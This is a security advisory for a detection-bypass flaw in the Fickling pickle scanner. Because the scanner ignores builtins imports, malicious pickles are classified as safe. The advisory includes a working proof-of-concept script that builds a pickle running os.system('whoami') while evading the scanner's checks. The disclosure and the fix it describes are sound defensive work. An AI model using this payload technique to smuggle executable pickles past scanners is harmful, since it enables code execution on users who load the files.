# [H] Fickling vulnerable to detection bypass due to "builtins" blindness

## Summary
Severity: High
Advisory: GHSA-h4rm-mm56-xf63
CVE: CVE-2026-22612
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-09
Source: https://github.com/advisories/GHSA-h4rm-mm56-xf63
Type: github-advisory

## Affected
- PyPI: `fickling` — affected >=0 <0.1.7

## Details
#Fickling's assessment

Fickling started emitting AST nodes for builtins imports in order to match them during analysis (https://github.com/trailofbits/fickling/commit/9f309ab834797f280cb5143a2f6f987579fa7cdf). 

# Original report

### Summary
Fickling works by
Pickle bytecode --> AST --> Security analysis
However while going from bytecode to AST, some import nodes are removed which blinds the security analysis

fickling/fickling/fickle.py
```python
    def run(self, interpreter: Interpreter):
        module, attr = self.module, self.attr
        if module in ("__builtin__", "__builtins__", "builtins"):
            # no need to emit an import for builtins!
            pass
        else:
            alias = ast.alias(attr)
            interpreter.module_body.append(ast.ImportFrom(module=module, names=[alias], level=0))
        interpreter.stack.append(ast.Name(attr, ast.Load()))

    def encode(self) -> bytes:
        return f"c{self.module}\n{self.attr}\n".encode()
```
Here we see that no import nodes are emitted for builtins
However builtins is marked as an unsafe import

fickling/fickling/analysis.py
```python
UNSAFE_MODULES = {
        "__builtin__": "This module contains dangerous functions that can execute arbitrary code.",
        "__builtins__": "This module contains dangerous functions that can execute arbitrary code.",
        "builtins": "This module contains dangerous functions that can execute arbitrary code.",
```

But because there are no import nodes for builtins (they werent emitted when making the AST), the security scanner is effectively blind.

This can allow for security bypasses like this

poc.py (script to create payload)
```python
import os

GLOBAL = b'c'    # Import module.name
STRING = b'S'    # Push string
TUPLE1 = b'\x85' # Build tuple of 1
TUPLE2 = b'\x86' # Build tuple of 2
EMPTY_TUPLE = b')'
REDUCE = b'R'    # Call function
PUT    = b'p'    # Memoize (Variable assignment)
GET    = b'g'    # Load from memo (Variable usage)
POP    = b'0'    # Discard top of stack
EMPTY_DICT = b'}'
SETITEM = b's'   # Add key/value to dict
BUILD  = b'b'    # Update object state (Liveness satisfy)
STOP   = b'.'    # Finish and return stack top

def generate_raw_payload():
    payload = b""

    payload += GLOBAL + b"builtins\n__import__\n"
    payload += STRING + b"'os'\n"
    payload += TUPLE1 + REDUCE
    payload += PUT + b"0\n" # _var0 = os module
    payload += POP

    payload += GLOBAL + b"builtins\ngetattr\n"
    payload += GET + b"0\n" # os module
    payload += STRING + b"'system'\n"
    payload += TUPLE2 + REDUCE
    payload += PUT + b"1\n" # _var1 = os.system
    payload += POP

    payload += GET + b"1\n" # os.system
    payload += STRING + b"'whoami'\n" # COMMAND
    payload += TUPLE1 + REDUCE
    payload += PUT + b"2\n" 
    payload += POP

    payload += GLOBAL + b"builtins\nException\n"
    payload += EMPTY_TUPLE + REDUCE
    payload += PUT + b"3\n"
    
    payload += EMPTY_DICT
    payload += STRING + b"'rce_status'\n"
    payload += GET + b"2\n" 
    payload += SETITEM  
    
    payload += BUILD
    
    payload += STOP

    return payload

if __name__ == "__main__":
    data = generate_raw_payload()
    with open("raw_bypass.pkl", "wb") as f:
        f.write(data)
    
    print("Generated 'raw_bypass.pkl'")
```

This creates a pickle file which imports the OS module using __import__ which is a part of builtins. if the security scanner wasnt blinded it would have been flagged immidiately.

However now fickling sees the pickle payload as

```python
_var0 = __import__('os')
_var1 = getattr(_var0, 'system')
_var2 = _var1('whoami')
_var3 = Exception()
_var4 = _var3
_var4.__setstate__({'rce_status': _var2})
result0 = _var4
```

<img width="810" height="182" alt="image" src="https://github.com/user-attachments/assets/5bfe8c34-7bc0-429f-83ce-d0c2f1928aca" />


As you can see there is no mention of builtins anywhere so it isnt flagged

Additionally, the payload builder uses a technique to ensure that no variable get flagged as "UNUSED"
We deceive the data flow analysis heuristic by using the BUILD opcode to update an objects internal state. 
By taking the result of os.system (the exit code) and using it as a value in a dictionary that is then "built" into a returned exception object, we create a logical dependency chain.

The end result is that the malicious pickle gets classified as LIKELY_SAFE

Fixes: 
Ensure that import objects are emitted for imports from builtins depending on what those imports are, say emit import nodes for dangerous functions like ```__import__``` while not emitting for stuff like ```dict()```

## References
- https://github.com/trailofbits/fickling/security/advisories/GHSA-h4rm-mm56-xf63
- https://nvd.nist.gov/vuln/detail/CVE-2026-22612
- https://github.com/trailofbits/fickling/pull/195
- https://github.com/trailofbits/fickling/commit/9f309ab834797f280cb5143a2f6f987579fa7cdf
- https://github.com/trailofbits/fickling
- https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L349
- https://github.com/trailofbits/fickling/releases/tag/v0.1.7
